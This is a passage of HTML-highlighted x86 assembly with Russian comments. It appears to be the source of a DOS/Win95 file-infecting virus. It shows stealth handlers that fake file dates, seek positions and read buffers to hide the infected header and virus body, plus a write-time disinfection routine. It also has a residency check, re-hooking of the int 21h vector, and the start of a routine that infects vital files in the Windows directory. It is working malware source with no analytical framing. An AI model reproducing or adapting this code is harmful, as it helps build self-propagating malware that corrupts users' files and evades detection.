        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; сейчас ES:[DI] содержит время Win95</span><span class="sc0">

 </span><span class="sc5">no_win</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; DATE stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">date_get</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSFT</span><span class="sc0">         </span><span class="sc1">; открыть SFT</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; запрос даты</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hidestm</span><span class="sc0">         </span><span class="sc1">; маскировка даты</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">seek_ret</span><span class="sc0">

 </span><span class="sc5">date_set</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSFT</span><span class="sc0">         </span><span class="sc1">; открыть SFT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; установка даты</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correctdate</span><span class="sc0">     </span><span class="sc1">; правка даты</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">seek_ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; LSEEK stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">seekstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSFT</span><span class="sc0">         </span><span class="sc1">; открыть SFT</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HandleCheck</span><span class="sc0">     </span><span class="sc1">; проверка файла IOCTL</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Inf_Check</span><span class="sc0">       </span><span class="sc1">; инфицирован?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; сохранение CX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; проверка типа</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">forw</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">        </span><span class="sc1">; маскировка настоящего конца файла</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; сдвиг идет от головы вируса</span><span class="sc0">
 </span><span class="sc5">forw</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; здесь установка указателя идет от начала</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; восстановление CX</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">seek_ret</span><span class="sc0">        </span><span class="sc1">; или от текущей позиции</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekhide</span><span class="sc0">        </span><span class="sc1">; блокировка попадания lseek на тело вируса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">seek_ret</span><span class="sc0">

 </span><span class="sc5">no_seek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; вызов DOS</span><span class="sc0">
 </span><span class="sc5">seek_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseSFT</span><span class="sc0">        </span><span class="sc1">; закрыть SFT</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; READ stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">readstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSFT</span><span class="sc0">         </span><span class="sc1">; открыть SFT</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HandleCheck</span><span class="sc0">     </span><span class="sc1">; проверка файла IOCTL</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Inf_Check</span><span class="sc0">       </span><span class="sc1">; инфицирован?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekSave</span><span class="sc0">        </span><span class="sc1">; сохранение позиции указателя</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; запрос чтения данных</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">seek_ret</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; дублирование смещения буфера</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; количество прочитанных байт</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0"> </span><span class="sc1">; читают заголовок?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">zone</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crload</span><span class="sc0">          </span><span class="sc1">; прочитать настоящее начало файла</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">       </span><span class="sc1">; SI -&gt; настоящее начало</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">  </span><span class="sc1">; SI -&gt; с учетем смещения чтения</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc0">   </span><span class="sc1">; считаем количество байт которые нам нужно</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">  </span><span class="sc1">; состелсить</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">           </span><span class="sc1">; позиция конца чтения лежит за пределом</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">             </span><span class="sc1">; сохраненного начала файла?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">

        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">zone</span><span class="sc0">            </span><span class="sc1">; в случае чтения 0 байт</span><span class="sc0">
 </span><span class="sc5">rhide</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; подмена инфицированного начала файла на</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; оригинальное</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rhide</span><span class="sc0">

 </span><span class="sc5">zone</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekhide</span><span class="sc0">        </span><span class="sc1">; блокируем возможность попадания lseek на</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; зону вируса + уменьшения числа прочитанных</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc0">   </span><span class="sc1">; байт</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">seek_ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; ALL HANDLER stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">patchsft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSFT</span><span class="sc0">         </span><span class="sc1">; открыть SFT</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; WRITE stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">diswrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSFT</span><span class="sc0">         </span><span class="sc1">; открыть SFT</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HandleCheck</span><span class="sc0">     </span><span class="sc1">; проверка файла IOCTL</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_seek</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Inf_Check</span><span class="sc0">       </span><span class="sc1">; инфицирован?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekSave</span><span class="sc0">        </span><span class="sc1">; сохранение позиции указателя</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; DS=CS</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crload</span><span class="sc0">          </span><span class="sc1">; загрузка оригинального начала в буфер</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2bof</span><span class="sc0">        </span><span class="sc1">; поместить указатель в начало файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">           </span><span class="sc1">; запись оригинального заголовка файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ошибка? ну тогда при записи того,</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">disfail</span><span class="sc0">         </span><span class="sc1">; чего просят ошибка будет тоже!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; двигаемся к голове вируса. т.е.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">       </span><span class="sc1">; к концу зараженной программы</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; обрезаем файл</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; удаляем тело вируса из вирусоносителя</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">          </span><span class="sc1">; сбрасываем буфера</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
 </span><span class="sc5">disfail</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreSeek</span><span class="sc0">     </span><span class="sc1">; восстанавление позиции указателя</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстанавление регистров</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_seek</span><span class="sc0">         </span><span class="sc1">; выходим</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; проверка инфицированности памяти</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">tsrtest</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3265h</span><span class="sc0">        </span><span class="sc1">; Hi, AX=3265</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; повторный перехват вектора int 21h</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">rehook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_dup</span><span class="sc0">         </span><span class="sc1">; проверка, был ли вектор уже</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_hook</span><span class="sc0">         </span><span class="sc1">; переустановлен</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WinOldAp</span><span class="sc0">        </span><span class="sc1">; проверка, что-нибудь изменилось с</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">w95state</span><span class="sc0">  </span><span class="sc1">; момента инсталляции вируса в память</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_hook</span><span class="sc0">         </span><span class="sc1">; (была ли загружена Win95)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; получение вектора int 21h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">        </span><span class="sc1">; установка нового вектора прерывания</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">manager</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_dup</span><span class="sc0">         </span><span class="sc1">; сохранение вектора в другой ячейке IVT</span><span class="sc0">
 </span><span class="sc5">no_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">

</span><span class="sc1">; ════════════════════════&gt; S·U·B·R·O·U·T·I·N·E·S &lt;═════════════════════════</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; заражение некоторых жизненно важных файлов</span><span class="sc0">
</span><span class="sc1">; использует STACKS в качестве буфера для имен файлов</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">FixVirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; загрузка сегмента Environment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">windir</span><span class="sc0">       </span><span class="sc1">; ES:DI -&gt; WINDIR=</span><span class="sc0">
 </span><span class="sc5">wdlook4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compare</span><span class="sc0">         </span><span class="sc1">; сравнение элеменита envir с шаблоном</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">wdfound</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fverror</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">wdlook4</span><span class="sc0">
 </span><span class="sc5">wdfound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">           </span><span class="sc1">; SI -&gt; директория windows</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">stacks</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">fixes</span><span class="sc0">

 </span><span class="sc5">fvinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">b</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fverror</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

